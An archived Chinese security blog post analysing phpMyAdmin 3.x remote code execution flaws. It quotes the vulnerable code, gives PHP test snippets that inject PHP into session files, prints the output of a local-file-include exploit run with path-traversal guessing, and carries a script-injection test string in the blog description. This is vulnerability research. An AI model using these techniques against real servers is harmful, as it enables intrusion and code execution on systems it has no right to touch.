                                    <!DOCTYPE html><html  id="customDoc"><!--STATUS OK--> <head> <meta http-equiv=Content-Type content="text/html; charset=utf-8"> <title> 关于phpMyAdmin 3.x那多个漏洞_5up3rh3i&#39;blog_百度空间</title> <link rel="shortcut icon" href="http://hi.bdimg.com/static/qbase/img/mod/16_favicon.ico?v=116ba471.ico" type=image/x-icon>   <meta name=keywords content="关于phpMyAdmin 3.x那多个漏洞,"> <meta name=description content="&lt;script&gt;/*///*/alert(1);&lt;/script&gt;
GTalk:5up3rh3i@gmail.com,关于phpMyAdmin 3.x那多个漏洞"><script>window.wpo={start:new Date*1,pid:109,page:'qing'}</script><!--[if IE]><script type="text/javascript">(function(){var e="abbr,article,aside,audio,canvas,datalist,details,dialog,eventsource,figure,footer,header,hgroup,mark,menu,meter,nav,output,progress,section,time,video".split(","),t=e.length;while(t--)document.createElement(e[t])})();</script><![endif]--><script>window.qDomain={"qing":"http://hi.baidu.com","static":"http://hi.bdimg.com","passport":"https://passport.baidu.com","portrait":"http://tx.bdimg.com","hiup":"http://hi.baidu.com","photo":"http://hiphotos.baidu.com","message":"http://msg.baidu.com","friend":"http://frd.baidu.com","mp3":"http://mp3.baidu.com","ting":"http://ting.baidu.com","image":"http://img.baidu.com","qup":"http://upload.hi.baidu.com","www":"http://www.baidu.com"};window.qUserInfo={"userName":"hi_heige","nickname":"hi_heige","portrait":"a93f68695f6865696765fa04","qingUrl":"\/hi_heige","spaceName":"5up3rh3i\&#39;blog","right":"0","avatarStatus":"1","flagNeedInvite":"0","flagNotInvited":"0","version":"2"};window.qVisitorInfo={"userName":"","nickname":"","portrait":"","isHost": false,"isRandUrl": false,"isForceMoved": false,"loginStatus":"not_login","isOldUser":0,"qingUrl":"","right":"0","version":"0"};window.qPageInfo={"pageUrl":"http:\/\/hi.baidu.com\/hi_heige\/item\/cf4371e3571b5bb12e140b43","referUrl":""};window.qUserAvatar={size20:"http://hiphotos.baidu.com/space/scrop=20;q=100/sign=536115cc0fb30f2431c4ab5cb8a8e373/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size40:"http://hiphotos.baidu.com/space/scrop=40;q=100/sign=275b84b942a7d933bbf6a32cdd76e523/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size65:"http://hiphotos.baidu.com/space/scrop=65;q=100/sign=6a4f52aec895d143de28a37c03cdb437/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size110:"http://hiphotos.baidu.com/space/scrop=110;q=100/sign=b0caf9930cf3d7ca08a8782982228f38/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg",size160:"http://hiphotos.baidu.com/space/scrop=160;q=100/sign=b0caf9930cf3d7ca08a8782982228f3f/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg"};window.qVisitorAvatar={size20:"",size40:"",size65:"",size110:"",size160:""};window.qBdsToken="the fisrt two args should be string type:0,1!";window.qErrorInfo={"no":"0","msg":""};window.qServerInfo={"timeStamp":"1428996214"};window.qLongPolling={"url":"http:\/\/m.hi.baidu.com\/i\/msg\/listen"}</script><!--[if (lt IE 8.0)]><link href="http://hi.bdimg.com/static/qbase/css/qbase.css?v=d097b2a7.css" type=text/css rel=stylesheet><![endif]--><!--[if (!IE)|(gte IE 8.0)]><!--><link href="http://hi.bdimg.com/static/qbase/css/qbase_datauri.css?v=c2391e47.css" type=text/css rel=stylesheet><!--<![endif]-->     <!--[if (lt IE 8.0)]><link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qcomment/css/qcomment.css?v=5ba753ab.css"><![endif]--><!--[if (!IE)|(gte IE 8.0)]><!--><link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qcomment/css/qcomment_datauri.css?v=a90beb01.css"><!--<![endif]--><link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qhome/css/common/mod_userInfo.css?v=86bf4259.css">    <!--[if (lt IE 8.0)]><link type=text/css rel=stylesheet href="http://hi.bdimg.com/static/qhome/css/detail/n0001/detail.css?v=2247b49c.css"><![endif]--><!--[if (!IE)|(gte IE 8.0)]><!--><link type=text/css rel=stylesheet href="http://hi.bdimg.com/static/qhome/css/detail/n0001/detail_datauri.css?v=8b3028a2.css"><!--<![endif]-->     <link rel=stylesheet type=text/css href="http://hi.bdimg.com/static/qpublish/css/editor/shCoreDefault.css?v=79e715f0.css">  <style type="text/css"></style>     <script src="http://hi.bdimg.com/static/qbase/js/qing/qing.js?v=4d5f41d2.js"></script>  <script>
    /*最终页页面变量*/ 
    window.detailPage = {
        threadId : "cf4371e3571b5bb12e140b43",
        blogTitle: "关于phpMyAdmin 3.x那多个漏洞" || "无标题",
        contentType : "text",
        originAuthorName : "",
        originPortrait : "",
        originThreadId : ""
    }; 
    </script><script>wpo.head=new Date*1;</script> </head> <body>  <header class=mod-topbar id=modTopbar><iframe class=mod-topbar-bgframe></iframe><div class=mod-topbar-pseudo-real><div class="wrapper-box clearfix"><div class=left-box><a href="http://hi.baidu.com" class=logo-box><span id=baiduSpaceLogo class=q-logo></span></a></div> <div class=center-box><ul class=q-menubox>  <li class="q-menuitem q-newicon"> <a href=http://xiangce.baidu.com target=_blank>相册</a>  <li class="q-menuitem " id=qMenuRecommend><a href="http://hi.baidu.com/index/">广场</a><li class="q-menuitem q-newicon q-menu-item-game"><a href=http://youxi.baidu.com/yxpm/pm.jsp?pid=10106000091_970983 target=_blank>游戏</a><div class=q-game-frame><iframe src=about:blank frameborder=no border=0 scrolling=0></iframe></div></ul></div>  <div class=right-box><ul class=q-navbox><li class=q-navitem> <a href="http://hi.baidu.com/go/login">登录</a><li class="q-navitem q-nav-sp"><span></span><li class=q-navitem><a href="http://hi.baidu.com/go/reg?pmfrom=qingtop">注册</a> </ul><div class="right mod-qhome-follow-box"><a href="#" class="follow-btn a-btn-follow qing-stat-nsclick" data-nsclick=20121012follow_hdbtnaddcare>关注此空间</a></div> </div> </div></div></header>  <section class=mod-page-body> <div class="mod-page-main wordwrap clearfix">  <div class=x-page-container>    <section class="mod-topspaceinfo mod-cs-header"><div class=head-topbar></div><div class=container><h1><a class="space-name cs-header-spacename" href="/hi_heige">5up3rh3i&#39;blog</a></h1><p class="space-description cs-header-spacesummary"> /*///*/alert(1); 
GTalk:5up3rh3i@gmail.com</p></div><div class=head-footer></div></section>   <div class=mod-blogpage-wraper> <div class="blog-bg-main-repeat hide"></div>  <div class="grid-80 mod-blogpage"> <div class="blog-bg-main hide"></div>    <div class="mod-text-content mod-post-content mod-cs-contentblock"> <div class=cs-contentblock-bg></div>   <div class="content-head clearfix">  <div class=content-other-info>  <span>2011-08-08 22:09</span>  </div>   <h2 class="title content-title">关于phpMyAdmin 3.x那多个漏洞</h2>  </div>  <div id=content class="content mod-cs-content text-content clearfix"> <p>先看看老外发布的漏洞公告《<a target="_blank" href="http://ha.xxor.se/2011/07/phpmyadmin-3x-multiple-remote-code.html">phpMyAdmin 3.x Multiple Remote Code Executions</a>》，文章里总共提到了4个vulnerability。但是这些漏洞的关键是第一个漏洞，也就是通过parse_str实现覆盖$_SESSION变量的漏洞，而后面的3个都是，覆盖$_SESSION后的利用。这里赞一下漏洞发现者和phpmyadmin官方人员的意识，因为官方也承认了其他的3个漏洞并且给出了对应的修补方式，详细见：<a target="_blank" href="http://www.phpmyadmin.net/home_page/security/">PMASA-2011-8/7/6/5</a>  这个也就是我多次在blog和文章里提到的“<a target="_blank" href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese">二次攻击漏洞</a>”及修补原则：<a target="_blank" href="http://hi.baidu.com/hi_heige/blog/item/2d5413e8da43d033b80e2df1.html">“一切进入函数的变量是有害的”、“进入函数前那刹那的防御才是王道”</a>...<br /><br />再来具体看看漏洞原因及利用：<br /><br />File: libraries/auth/swekey/swekey.auth.lib.php<br />&nbsp;&nbsp;&nbsp; <br />if (strstr($_SERVER['QUERY_STRING'],'session_to_unset') != false)<br />{<br />&nbsp;&nbsp;&nbsp; parse_str($_SERVER['QUERY_STRING']);<br />&nbsp;&nbsp;&nbsp; session_write_close();<br />&nbsp;&nbsp;&nbsp; session_id($session_to_unset);<br />&nbsp;&nbsp;&nbsp; session_start();<br />&nbsp;&nbsp;&nbsp; $_SESSION = array();<br />&nbsp;&nbsp;&nbsp; session_write_close();<br />&nbsp;&nbsp;&nbsp; session_destroy();<br />&nbsp;&nbsp;&nbsp; exit;<br />}<br /><br />对于parse_str($_SERVER['QUERY_STRING']);导致的变量覆盖的问题，大家应该不会陌生，在《<a target="_blank" href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese">高级PHP应用程序漏洞审核技术</a>》就有提到。至于通过parse_str覆盖$_SESSION后的问题，由于当时我对php处理$_SESSION的问题的认识一直比较模糊，并且由于时间问题对phpmyadmin的这个漏洞提交流程确实全面的认识，就凭着以往的一些经验，在设置php.ini里的session.auto_start = 1，然后就成功触发了该漏洞，这个也就是<a target="_blank" href="http://www.exploit-db.com/exploits/17510/">wofeiwo公布的那个exploit</a>里要求“session.auto_start = 1 in php.ini configuration.”的原因。不过对于为什么要求session.auto_start的原因，我还是不清楚，后来有时间时候，经过wofeiwo的指点才搞清楚：<br /><br />&lt;?php<br />//sess_1.php<br />$_SESSION['abcde'] = &quot;aaaa&quot;;<br />session_start();<br />var_dump($_SESSION);<br />?&gt;<br /><br />&lt;?php<br />//sess_2.php<br />session_start();<br />$_SESSION['abcde'] = &quot;aaaa&quot;;<br />session_start();<br />var_dump($_SESSION);<br />?&gt;<br /><br />当session.auto_start =1是php自身自动实现了一个session_start();所以直接提交sess_1.php时必须要求session.auto_start = 1，$_SESSION['abcde'] = &quot;aaaa&quot;;才可以注册成功。我们回到phpmyadmin那么只要我们，在require libraries/auth/swekey/swekey.auth.lib.php这个文件之前有session_start();就行，那么我们在\libraries\session.inc.php 里找到了满足要求的session_start()：<br /><br />if (! isset($_COOKIE[$session_name])) {<br />&nbsp;&nbsp;&nbsp; // on first start of session we check for errors<br />&nbsp;&nbsp;&nbsp; // f.e. session dir cannot be accessed - session file not created<br />&nbsp;&nbsp;&nbsp; $orig_error_count = $GLOBALS['error_handler']-&gt;countErrors();<br />&nbsp;&nbsp;&nbsp; $r = session_start();<br />&nbsp;&nbsp;&nbsp; if ($r !== true || $orig_error_count != $GLOBALS['error_handler']-&gt;countErrors()) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setcookie($session_name, '', 1);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PMA_fatalError('strSessionStartupErrorGeneral');<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; unset($orig_error_count);<br />} else {<br />&nbsp;&nbsp;&nbsp; @session_start();&nbsp; //这里<br />}<br /><br />那么我们通过主页提交就可以了，具体的包含文件流程就不分析了。这时候作者也给出了他的一个exp：《<a target="_blank" href="http://www.exploit-db.com/exploits/17514/">phpMyAdmin 3.x Swekey Remote Code Injection Exploit</a>》，但是经过测试你会发现这个exp的成功率不高及时满足config目录的条件下，这个是因为作者的exp里的playload受到魔术引号导致的，于是就有了<a target="_blank" href="http://www.oldjun.com/blog/index.php/archives/81/">oldjun的exp</a>.<br /><br />以上的exp都是基于漏洞公告里的“The second vulnerability”的利用，后来作者又给出了“The third vulnerability”的exp：<a target="_blank" href="http://ha.xxor.se/2011/07/phpmyadmin-3x-pregreplace-rce-poc.html">http://ha.xxor.se/2011/07/phpmyadmin-3x-pregreplace-rce-poc.html</a>对于利用来讲，这个exp先天不足本身受魔术引号的影响！ <br /><br />另外值得一提的是，俄罗斯人M4g通过利用se牛发现的一个漏洞，找到了新的利用点：<a target="_blank" href="http://snipper.ru/view/103/phpmyadmin-33102-3431-session-serializer-arbitrary-php-code-execution-exploit/">http://snipper.ru/view/103/phpmyadmin-33102-3431-session-serializer-arbitrary-php-code-execution-exploit/</a><br /><br />利用的是《<a target="_blank" href="http://php-security.org/2010/05/31/mops-2010-060-php-session-serializer-session-data-injection-vulnerability/index.html">MOPS-2010-060: PHP Session Serializer Session Data Injection Vulnerability</a>》 ，至于为什么要用到这个漏洞，原因是phpmyadmin的session里的PMA_Config的类型是object，是没办法直接通过变量覆盖提交。有兴趣的可以自己测试。<br /><br />最后还有一个“The fourth vulnerability”本地包含的漏洞没有exp了，于是我继续exp一下，最后发现就渗透利用而言这个才是最有“价值”的！ 关键代码是：<br /><br />File: libraries/display_tbl.lib.php<br />Lines: 707-710<br />&nbsp;&nbsp;&nbsp; <br />if ($GLOBALS['cfgRelation']['commwork'] &amp;&amp; $GLOBALS['cfgRelation']['mimework'] &amp;&amp; $GLOBALS['cfg']['BrowseMIME'] &amp;&amp; ! $_SESSION['tmp_user_values']['hide_transformation']) {<br />&nbsp;&nbsp;&nbsp; require_once './libraries/transformations.lib.php';<br />&nbsp;&nbsp;&nbsp; $GLOBALS['mime_map'] = PMA_getMIME($db, $table);<br />}<br /><br />典型的“条件下变量初始化问题”，也就是说当if条件不满足的时候，变量$GLOBALS['mime_map']就没有赋值，也就是变量没有初始化！！至于exp的利用我采用里俄罗斯人的方法，包含sesson文件，暴力下session目录就ok了，不过蛋疼的是，php不让包含本次会话的session文件，如下测试代码：<br /><br />&lt;?php<br />$sesspath=&quot;/tmp&quot;;<br />session_start();<br />$_SESSION['abcde'] = &quot;&lt;?phpinfo();?&gt;&quot;;<br />include($sesspath.&quot;sess_&quot;.session_id());<br />?&gt;<br /><br />最后给出exploit的效果：<br /><br />root@ubuntu:/home/heige# php ./phpmyadmin_include_poc.php -h http://192.168.0.10/phpMyAdmin -u root -p&nbsp; -d mysql <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\&nbsp;&nbsp;&nbsp;&nbsp; .<br />&nbsp; .&nbsp; ,/)&nbsp;&nbsp; , /&nbsp; ) ,&nbsp; )\<br />&nbsp; )\(&nbsp; /)/( (__( /( /&nbsp; )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ________&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __<br />&nbsp;/&nbsp; \&nbsp; (&nbsp;&nbsp; )|&nbsp; |)&nbsp; \&nbsp; /&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |\&nbsp; /|&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |&nbsp; |&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (__)<br />(&nbsp; ______ / |&nbsp; |_____(&nbsp; ______&nbsp;&nbsp; |&nbsp; | \/ |&nbsp; |&nbsp; __&nbsp;&nbsp;&nbsp; __&nbsp; |&nbsp; |__|&nbsp; |&nbsp;&nbsp; ___|&nbsp; |&nbsp; __ ___________&nbsp;&nbsp; __&nbsp;&nbsp; __ _____<br />&nbsp;\|&nbsp; | \&nbsp; \ |&nbsp; |&nbsp; |&nbsp; |)|&nbsp; | \&nbsp; \ |&nbsp; |&nbsp;&nbsp;&nbsp; |&nbsp; | |&nbsp; |&nbsp; |&nbsp; | |&nbsp; |&nbsp; |&nbsp; | /&nbsp; / |&nbsp; | |&nbsp; |&nbsp; |&nbsp; |&nbsp; |&nbsp; | |&nbsp; | |&nbsp; |&nbsp; |&nbsp; |<br />&nbsp; |&nbsp; |_/__/ |__|&nbsp; |__| |&nbsp; |_/__/ |__|&nbsp;&nbsp;&nbsp; |__| |__|__|&nbsp; | |__|&nbsp; |__| \__\_|__| |__|&nbsp; |__|&nbsp; |__| |__| |__|&nbsp; |__|<br />==|__|=================|__|=========================|__|======================================================&nbsp;&nbsp;&nbsp; <br /># pma3exp - phpMyAdmin3 local include exploit<br /># by 80vul <br /># codz base on http://www.xxor.se/uploads/phpmyadmin_preg_replace_rce_poc.php<br /># Reference: http://ha.xxor.se/2011/07/phpmyadmin-3x-multiple-remote-code.html<br /><br /><br />[i] Running...<br />[*] Contacting server to authenticate.<br />[i] Cookie:pma_mcrypt_iv=O8GeDrSMyp4%3D; phpMyAdmin=8e295790f223d07054aab13c7fc87ac6629366c7; pmaUser-1=Zo1Pp49vdR0%3D; pmaPass-1=ggEX%2BxDMg3A%3D<br />[i] Token:1db063c5b08202ea26057a6cf3e82a5d<br />[i] Session:8e295790f223d07054aab13c7fc87ac6629366c7<br />[*] Please set args -s 8e295790f223d07054aab13c7fc87ac6629366c7 and try again<br />[*] Contacting server to poison some _SESSION variables.<br />root@ubuntu:/home/heige# php ./phpmyadmin_include_poc.php -h http://192.168.0.10/phpMyAdmin -u root -p&nbsp; -d mysql -s 8e295790f223d07054aab13c7fc87ac6629366c7<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\&nbsp;&nbsp;&nbsp;&nbsp; .<br />&nbsp; .&nbsp; ,/)&nbsp;&nbsp; , /&nbsp; ) ,&nbsp; )\<br />&nbsp; )\(&nbsp; /)/( (__( /( /&nbsp; )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ________&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __<br />&nbsp;/&nbsp; \&nbsp; (&nbsp;&nbsp; )|&nbsp; |)&nbsp; \&nbsp; /&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |\&nbsp; /|&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |&nbsp; |&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (__)<br />(&nbsp; ______ / |&nbsp; |_____(&nbsp; ______&nbsp;&nbsp; |&nbsp; | \/ |&nbsp; |&nbsp; __&nbsp;&nbsp;&nbsp; __&nbsp; |&nbsp; |__|&nbsp; |&nbsp;&nbsp; ___|&nbsp; |&nbsp; __ ___________&nbsp;&nbsp; __&nbsp;&nbsp; __ _____<br />&nbsp;\|&nbsp; | \&nbsp; \ |&nbsp; |&nbsp; |&nbsp; |)|&nbsp; | \&nbsp; \ |&nbsp; |&nbsp;&nbsp;&nbsp; |&nbsp; | |&nbsp; |&nbsp; |&nbsp; | |&nbsp; |&nbsp; |&nbsp; | /&nbsp; / |&nbsp; | |&nbsp; |&nbsp; |&nbsp; |&nbsp; |&nbsp; | |&nbsp; | |&nbsp; |&nbsp; |&nbsp; |<br />&nbsp; |&nbsp; |_/__/ |__|&nbsp; |__| |&nbsp; |_/__/ |__|&nbsp;&nbsp;&nbsp; |__| |__|__|&nbsp; | |__|&nbsp; |__| \__\_|__| |__|&nbsp; |__|&nbsp; |__| |__| |__|&nbsp; |__|<br />==|__|=================|__|=========================|__|======================================================&nbsp;&nbsp;&nbsp; <br /># pma3exp - phpMyAdmin3 local include exploit<br /># by 80vul <br /># codz base on http://www.xxor.se/uploads/phpmyadmin_preg_replace_rce_poc.php<br /># Reference: http://ha.xxor.se/2011/07/phpmyadmin-3x-multiple-remote-code.html<br /><br /><br />[i] Running...<br />[*] Contacting server to authenticate.<br />[i] Cookie:pma_mcrypt_iv=MSiItAKLpTs%3D; phpMyAdmin=d1e429fe86d129be587056a09d1f44b56a48e859; pmaUser-1=wlbi7hEJiGE%3D; pmaPass-1=XypvwpApS5k%3D<br />[i] Token:4ca3b4ca2bc3cf6c779109493386c181<br />[i] Session:d1e429fe86d129be587056a09d1f44b56a48e859<br />[*] Contacting server to poison some _SESSION variables.<br />[-] ../../../../../../../../../../../../../../../../tmp/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../temp/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/tmp/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/lib/php/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/lib/php4/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/lib/php5/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/lib/php/session/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/lib/php4/session/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/lib/php5/session/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../shared/sessionssess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/php_sessions/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../var/sessions/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../tmp/php_sessions/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../tmp/sessions/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../../../../../../../../../../../../../../../tmp/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../tmp/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[-] ../../tmp/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - bad path<br />[+] ../../../../tmp/sess_8e295790f223d07054aab13c7fc87ac6629366c7 - good path<br />[!] Code injection successfull. This instance of phpMyAdmin is vulnerable!<br /><br />故事好像到这里应该就要结束了，结果没过多久又出了个PMASA-2011-12 还是那个老外，还是那个文件，还是那个parse_str($_SERVER['QUERY_STRING']); ，有一种漏洞叫“相似性漏洞”！关于这个问题可能在我以后的文档里会提到，只是PMASA-2011-12里要达到parse_str($_SERVER['QUERY_STRING']);这个代码位置，条件非常苛刻!有兴趣的朋友请自己分析 ：）<br /><br />最后，感谢上面提交的那些朋友！<br /></p> </div>    <div class="mod-tagbox clearfix"> </div> <div class="mod-post-info clearfix">  <div class=x-bdshare>  <div id=bdshare class="bdshare_t bds_tools get-codes-bdshare" data="{'wbuid':1727466295}"> <span class=bds_more>分享到：</span> <a class=bds_qzone></a> <a class=bds_tsina></a> <a class=bds_tqq></a> <a class=bds_renren></a> </div> <script id=bdshare_js data="type=tools&amp;uid=713670"></script> <script id=bdshell_js></script> <script>
        var bds_config = {'bdTop':240};
                    var all_img = qing.g('content').getElementsByTagName('img');
            if(all_img.length>0){
                bds_config.bdPic = all_img[0].src;
            }
                document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?v=72836429.js?cdnversion=" + Math.ceil(new Date()/3600000);
    </script> </div> <div class="op-box mod-cs-opBox">  <a class="report-btn hide" target=_blank href="#"> 举报 </a>  <span class=pv>浏览(5366)</span> <a class=comment-bnt id=commentBnt href="#" onclick="return false"> 评论<span class=comment-nub>(4)</span> </a>   <a href="#" id=shareBnt onclick="return false" class=share-bnt> 转载<span id=shareNub class=share-nub></span> </a>   </div> </div>   </div>    <div class=mod-share-detail id=shareDetail style=display:none></div>   <div class=mod-relate-blogs id=relateBlog> <h3 class=relate-title>你可能也喜欢</h3> <ul class="relate-blog-list clearfix">   <li  class=first > <a href="http://hi.baidu.com/glsxb/item/95f0cb19c513ff75f1090e2a" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://d.hiphotos.baidu.com/space/scrop=90/sign=7fe39f0ee4cd7b89ed327ddc7f197b97/359b033b5bb5c9eabe2a9c27d739b6003bf3b31d.jpg" class=relate-img alt="《空间周刊》2014年第24期（总第44期）" title="《空间周刊》2014年第24期（总第44期）"> </a> <a href="http://hi.baidu.com/glsxb/item/95f0cb19c513ff75f1090e2a" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>《空间周刊》2014年第24期（总第44期）</a>    <li > <a href="http://hi.baidu.com/56dapei/item/bac0976c580dd33c7ddecc80" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://g.hiphotos.baidu.com/space/scrop=90/sign=eb856804e51190ef05a5d580be26a426/0b55b319ebc4b7452d190fffcdfc1e178b82154d.jpg" class=relate-img alt="章子怡黑白裙装拍摄杂志大片" title="章子怡黑白裙装拍摄杂志大片"> </a> <a href="http://hi.baidu.com/56dapei/item/bac0976c580dd33c7ddecc80" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>章子怡黑白裙装拍摄杂志大片</a>    <li > <a href="http://hi.baidu.com/gongzhumochu/item/68d17370bcf6fe116cc37ccd" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://c.hiphotos.baidu.com/space/scrop=90/sign=bcfebde3d109b3deefe1a337bc8255b1/267f9e2f07082838f580c69fb899a9014d08f1a8.jpg" class=relate-img alt="华谊二十周年 李冰冰姚晨angelababy红毯上争奇斗艳" title="华谊二十周年 李冰冰姚晨angelababy红毯上争奇斗艳"> </a> <a href="http://hi.baidu.com/gongzhumochu/item/68d17370bcf6fe116cc37ccd" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>华谊二十周年 李冰冰姚晨angelababy红毯上争奇斗艳</a>    <li > <a href="http://hi.baidu.com/qq1097552/item/ffee5d5245a52324aaf6d704" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://d.hiphotos.baidu.com/space/scrop=90/sign=4f217bdb1bd8bc3ec2564195f2b69f2e/a8014c086e061d9529dbf9d979f40ad163d9cab6.jpg" class=relate-img alt="艾琳·菲瑟斯顿 (Erin Fetherston)" title="艾琳·菲瑟斯顿 (Erin Fetherston)"> </a> <a href="http://hi.baidu.com/qq1097552/item/ffee5d5245a52324aaf6d704" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>艾琳·菲瑟斯顿 (Erin Fetherston)</a>    <li > <a href="http://hi.baidu.com/moraneh/item/96723d168d9b5f15e2f98658" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://e.hiphotos.baidu.com/space/scrop=90/sign=b7c537ca9045d688a75cf5fbd4ff442e/9922720e0cf3d7ca0ff3c18ff01fbe096a63a9c6.jpg" class=relate-img alt="黑白之恋 莫小棋" title="黑白之恋 莫小棋"> </a> <a href="http://hi.baidu.com/moraneh/item/96723d168d9b5f15e2f98658" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>黑白之恋 莫小棋</a>    <li > <a href="http://hi.baidu.com/shangjuyuan/item/66d8b71ead57d8eb9913d6e4" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://a.hiphotos.baidu.com/space/scrop=90/sign=89be7c11b4fd5266a3757b4bdb25ae1b/1b4c510fd9f9d72a682c60e7d62a2834359bbbfb.jpg" class=relate-img alt="范冰冰vs黄晓明魅摄心魂登6月封面" title="范冰冰vs黄晓明魅摄心魂登6月封面"> </a> <a href="http://hi.baidu.com/shangjuyuan/item/66d8b71ead57d8eb9913d6e4" target=_blank class="relate-txt qing-stat-nsclick" data-nsclick=m_20121105_detail_relates_txt>范冰冰vs黄晓明魅摄心魂登6月封面</a>    <li > <a href="http://hi.baidu.com/hi_heige/item/da06a0cc38681d3945941643" target=_blank class=qing-stat-nsclick data-nsclick=m_20121105_detail_relates_img> <img src="http://a.hiphotos.baidu.com/space/scrop=90/sign=b8ba13bf720e0cf3a4a909a47a7bcb2f/838ba61ea8d3fd1f69dc1c97304e251f94ca5f41.jpg" 